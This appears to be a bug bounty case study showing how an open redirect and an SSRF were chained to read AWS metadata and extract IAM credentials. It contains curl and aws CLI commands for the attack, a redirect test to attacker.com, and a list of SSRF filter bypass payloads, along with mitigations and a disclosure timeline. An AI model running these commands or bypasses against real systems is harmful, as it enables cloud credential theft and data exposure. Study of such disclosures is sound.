# SSRF to Internal AWS Metadata — A Bug Bounty Case Study

**Tag:** Web Hacking · **Date:** Oct 2025 · **Read time:** 11 min

---

This is a walkthrough of a bug bounty finding where I chained an open redirect with a blind SSRF to reach the EC2 instance metadata service (IMDS) and extract IAM credentials. The full chain took about 3 hours to find and exploit.

## Discovery — Finding the Open Redirect

During recon on `*.target.com`, httpx flagged a subdomain with an unusual redirect parameter:

```
https://api.target.com/v2/redirect?url=https://example.com
```

Testing with an external URL confirmed it redirected without validation:

```bash
curl -I "https://api.target.com/v2/redirect?url=https://attacker.com"
# HTTP/2 302
# location: https://attacker.com
```

## Pivoting to SSRF

The redirect endpoint was used internally by a PDF generation service. When I passed an internal URL, the server fetched it:

```bash
# Test with internal IP
curl -I "https://api.target.com/v2/redirect?url=http://169.254.169.254/"
# HTTP/2 200
# content-type: text/html
```

The response body contained the EC2 metadata root:

```
latest/
1.0/
2007-01-19/
2007-03-01/
...
```

## Extracting IAM Credentials

```bash
# Get IAM role name
curl "https://api.target.com/v2/redirect?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Response: app-production-role

# Get credentials
curl "https://api.target.com/v2/redirect?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-production-role"
```

Response:

```json
{
  "Code": "Success",
  "LastUpdated": "2025-10-14T08:23:11Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2025-10-14T14:23:11Z"
}
```

## Assessing the Impact

With temporary IAM credentials, I tested what the role could access:

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# What can this role do?
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name app-production-role

# Test S3 access
aws s3 ls

# Test EC2
aws ec2 describe-instances --region us-east-1
```

The role had `s3:GetObject` on a bucket containing customer PII — **Critical severity**.

## The Full Attack Chain

```
1. Open redirect at /v2/redirect?url=
   ↓
2. PDF service fetches the redirect target server-side
   ↓
3. Redirect target = http://169.254.169.254/ (IMDS)
   ↓
4. IMDS returns IAM role credentials
   ↓
5. Credentials used to access S3 bucket with customer PII
```

## Bypassing SSRF Filters

If the endpoint had basic SSRF protection, these bypasses are worth trying:

```bash
# Decimal IP
http://2130706433/          # 127.0.0.1 in decimal

# Octal
http://0177.0.0.1/

# IPv6
http://[::1]/
http://[::ffff:169.254.169.254]/

# DNS rebinding (requires controlled domain)
# A record: 169.254.169.254

# URL encoding
http://169.254.169.254%2F

# Double URL encoding
http://169%2E254%2E169%2E254/

# IMDSv2 bypass (if v1 is disabled, try v2 token endpoint)
# PUT http://169.254.169.254/latest/api/token
```

## IMDSv2 — The Mitigation

AWS introduced IMDSv2 which requires a PUT request with a TTL header before GET requests work. This breaks most SSRF chains because SSRF typically only allows GET.

```bash
# IMDSv2 — requires PUT first
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/"
```

**Recommendation:** Enforce IMDSv2 on all EC2 instances:

```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxx \
  --http-tokens required \
  --http-endpoint enabled
```

## Disclosure Timeline

| Date | Event |
|------|-------|
| Oct 3, 2025 | Initial discovery of open redirect |
| Oct 4, 2025 | SSRF confirmed, IMDS reached |
| Oct 4, 2025 | IAM credentials extracted, impact assessed |
| Oct 5, 2025 | Report submitted via HackerOne |
| Oct 7, 2025 | Triaged as Critical |
| Oct 12, 2025 | Fix deployed (IMDSv2 enforced + redirect validation) |
| Oct 14, 2025 | Bounty paid |

## Key Takeaways

1. **Open redirects aren't just phishing vectors** — they're SSRF enablers when used by server-side services
2. **Always test redirect parameters against 169.254.169.254** — it's the first thing to try on AWS
3. **IMDSv2 is not optional** — enforce it on every EC2 instance
4. **Validate redirect targets server-side** — allowlist expected domains, reject everything else
